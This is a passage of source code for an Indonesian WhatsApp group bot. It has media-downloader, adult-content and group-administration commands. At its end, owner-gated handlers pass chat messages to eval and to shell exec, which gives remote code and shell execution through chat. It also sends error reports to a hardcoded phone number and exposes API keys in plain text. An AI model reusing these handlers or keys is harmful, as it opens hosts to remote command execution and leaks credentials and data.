				qyuunee.sendMessage(m.chat, { video: { url: data.data.nowm }, fileName: `${data.data.title}.mp4`, mimetype: 'video/mp4' }).then(() => {
				qyuunee.sendMessage(m.chat, { audio: { url: data.data.mp3 }, fileName: `${data.data.title}.mp3`, mimetype: 'audio/mp4' })
			})
			})
			.catch(console.error)
			break

case 'tiktokmp4':
			if (args.length == 0) return reply(`Example: ${prefix + command} link lu`)
			reply(mess.wait)
			axios.get(`https://vihangayt.me/download/tiktok2?url=${args[0]}`).then(({ data }) => {
				qyuunee.sendMessage(m.chat, { video: { url: data.data.nowm }, fileName: `${data.data.title}.mp4`, mimetype: 'video/mp4' })
			})
			.catch(console.error)
			break

case 'tiktokmp3':
			if (args.length == 0) return reply(`Example: ${prefix + command} link lu`)
			reply(mess.wait)
			axios.get(`https://vihangayt.me/download/tiktok2?url=${args[0]}`).then(({ data }) => {
				qyuunee.sendMessage(m.chat, { audio: { url: data.data.mp3 }, fileName: `${data.data.title}.mp3`, mimetype: 'audio/mp4' })
			})
			.catch(console.error)
			break

case 'ig':
case 'igdl':
if (!q) return reply("Link?")
let res = await fetch(`https://vihangayt.me/download/instagram?url=${q}`)
let json = await res.json()
let cap = `🍂 Done...`
qyuunee.sendMessage(m.chat, { video: { url: json.data.data[0].url }, caption: cap })
.catch(console.error)
break

case 'play':
if (!isOwner) return reply("🚫 ERROR...")
			if (args.length == 0) return reply(`Example: ${prefix + command} bad - wave to earth`)
			reply(mess.wait)
			axios.get(`https://zeltoria.site/api/download/play?q=${args[0]}`).then(({ data }) => {
				qyuunee.sendMessage(m.chat, { audio: { url: data.result.result }, mimetype: 'audio/mp4', fileName: `${data.result.title}.mp3`, caption: `*Title: ${data.result.title}*\n*Size: ${data.result.size}*\n*Duration: ${data.result.duration}*` })
			})
			.catch(console.error)
			break

case 'ytmp3':
if (!isOwner) return reply("🚫 ERROR...")
			if (args.length == 0) return reply(`Example: ${prefix + command} link lu`)
			reply(mess.wait)
			axios.get(`https://vihangayt.me/download/ytmp4?url=${args[0]}`).then(({ data }) => {
				qyuunee.sendMessage(m.chat, { audio: { url: data.data.vid_360p }, mimetype: 'audio/mp4', fileName: `${data.data.title}.mp3` })
			})
			.catch(console.error)
			break

case 'ytmp4':
if (!isOwner) return reply("🚫 ERROR...")
			if (args.length == 0) return reply(`Example: ${prefix + command} link lu`)
			reply(mess.wait)
			axios.get(`https://vihangayt.me/download/ytmp4?url=${args[0]}`).then(({ data }) => {
				qyuunee.sendMessage(m.chat, { video: { url: data.data.vid_360p }, mimetype: 'video/mp4' })
			})
			.catch(console.error)
			break

case 'mediafire':
			if (args.length == 0) return reply(`Example: ${prefix + command} link lu`)
			reply(mess.wait)
			axios.get(`https://vihangayt.me/download/mediafire?url=${args[0]}`).then(({ data }) => {
				qyuunee.sendMessage(from, { document: { url: data.data.link }, fileName: `${data.data.name}`, mimetype: 'application/zip' })
			})
			.catch(console.error)
			break

case 'nekopoi':
if (!isOwner) return reply("You GAY !!!")
			reply(mess.wait)
			axios.get(`https://api.ibeng.tech/api/anime/nekopoi?apikey=Yl4h5x9wiA`).then(({ data }) => {
				qyuunee.sendMessage(from, { document: { url: data.data }, fileName: `Hentai`, mimetype: 'video/mp4' })
			})
			.catch(console.error)
			break

case 'nhentai':
if (!isOwner) return reply("You GAY !!!")
if (args.length == 0) return reply(`Example: ${prefix + command} kode`)
			reply(mess.wait)
			axios.get(`https://xzn.wtf/api/nhentai?code=${args[0]}&apikey=ikan`).then(({ data }) => {
				qyuunee.sendMessage(from, { document: { url: data.download }, fileName: `${data.title.english}.pdf`, mimetype: 'application/pdf' })
			})
			.catch(console.error)
			break

case 'waifu':
case 'loli':
reply(mess.wait)
				qyuunee.sendMessage(from, { image: { url: `https://api.ibeng.tech/api/sfw/${command}?apikey=Yl4h5x9wiA`}, caption: `😋 Ini ${command}-nya Kak...`})
		    .catch(console.error)
	        break

case 'pinterest':
if (!isOwner) return reply(mess.only.owner)
if (args.length < 0) return reply(`Kirim perintah ${command} query atau ${command} query --jumlah\nContoh :\n${command} cecan atau ${command} cecan --5`)
                   var jumlah;
                   if (q.includes('--')) jumlah = q.split('--')[1]
                   if (jumlah > 5) return reply(`Maksimal 5`)
                   reply(mess.wait)
                   pinterest(q.replace('--'+jumlah, '')).then(async(data) => {
                     if (q.includes('--')) {
                       if (data.length < jumlah) {
                         jumlah = data.length
                         reply(`Hanya ditemukan ${data.length}, foto segera dikirim`)
                       }
                       for (let i = 0; i < jumlah; i++) {
                         qyuunee.sendMessage(from, { image: { url: data[i] }})
                       }
                     } else {
                       qyuunee.sendMessage(from, { caption: `Hasil pencarian dari ${q}`, image: { url: pickRandom(data) }}, { quoted: m })
                     }
                   })
                   .catch(console.error)
                   break

case "tagall":{
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!text) return reply("Teks Nya Mana Kak?")
global.txtag = text
let teks = `\`\`\`「  TAG ALL  」\`\`\`

*Message : ${global.txtag ? global.txtag : "no message"}*\n\n`
for (let mem of pwkdnwn) {
teks += `» @${mem.id.split('@')[0]}\n`
}
qyuunee.sendMessage(from, { text: teks, mentions: pwkdnwn.map(a => a.id) }, { quoted: m })
}
break
case "hidetag": {
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!text) return reply("Teks Nya Mana Kak?")
global.txhtg = text
qyuunee.sendMessage(from, { text : global.txhtg , mentions: pwkdnwn.map(a => a.id)}, { quoted: fowner })
}
break
case "add": {
if (!isGroup) return reply(mess.only.group)
if (!isOwner) return reply(mess.only.owner)
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await qyuunee.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "kick": {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await qyuunee.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "promote": {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await qyuunee.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "demote": {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await qyuunee.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "group": {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] == 'close') {
qyuunee.groupSettingUpdate(from, 'announcement')
reply(`Sukses Mengizinkan Hanya Admin Yang Dapat Mengirim Pesan Ke Grup Ini`)
} else if (args[0] == 'open') {
qyuunee.groupSettingUpdate(from, 'not_announcement')
reply(`Sukses Mengizinkan Semua Peserta Dapat Mengirim Pesan Ke Grup Ini`)
} else {
reply(`Kirim Perintah ${prefix+command} _options_\nOptions : close & open\nContoh : ${prefix+command} close`)
}
}
break
case "revoke":{
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
const lajh = await qyuunee.groupRevokeInvite(from)
reply(`*Succes Ni Kak Link Group New*\nhttps://chat.whatsapp.com/` + lajh)
}
break
case "linkgroup":{
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.only.badmin)
const url = await qyuunee.groupInviteCode(from)
const asu = "https://chat.whatsapp.com/" + url
reply("_Ni Kak Link Group Nya Di Bawah Jangan Lupa Share_\n"+asu)
}
break
case "infogroup":{
if (!m.isGroup) return reply(mess.group)
const url = await qyuunee.groupInviteCode(from)
let teks88 = `\`\`\`「  INFO GROUP  」\`\`\`
▸ Name : ${groupName}
▸ Owner : ${groupOwner !== undefined ? "wa.me/" + groupOwner.split("@")[0] : "Tidak diketahui"}
▸ Creation : ${moment(groupMetadata.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB
▸ Total Admins : ${groupAdmins.length}
▸ Total Members : ${pwkdnwn.map((x) => x.id).length}
▸ Link : ${isBotGroupAdmins? `https://chat.whatsapp.com/${url}` : "Botz Is Not Admin"}`
await qyuunee.sendMessage(from, { image: { url: ppgroup }, caption: teks88 }, { quoted: m })
}
break
case "setnamagroup":{
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!text) return reply(`Teks Nya?`)
global.setmg = text
await qyuunee.groupUpdateSubject(m.chat, global.setmg)
reply(`Sukses Mengubah Nama Group Menjadi : ` + global.setmg)
}
break
case "setdescgroup":{
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!text) return reply(`Teks Nya?`)
global.setde = text
await qyuunee.groupUpdateDescription(m.chat, global.setde)
reply(`Sukses Mengganti Deksripsi Group Menjadi : ` + global.setde)
}
break
case "antilink": {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] == 'on') {
if (antilink) return reply('*Sudah Aktif*')
antilink = true
reply('*Berhasil Mengaktifkan Antilink*')
} else if (args[0] == 'off') {
if (!antilink) return reply('*Belum Aktif*')
antilink = false
reply('*Berhasil Mematikan Antilink*')
} else {
reply(`Command ${prefix+command} on = Untuk Menyalakan Antilink\nCommand ${prefix+command} off = Untuk Mematikan`)
}
}
break
default:
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
if (budy.startsWith("$")){
if (!isOwner) return reply(mess.only.owner)
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}
} catch (e) {
console.log(e)
qyuunee.sendMessage("6289508082845@s.whatsapp.net", {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})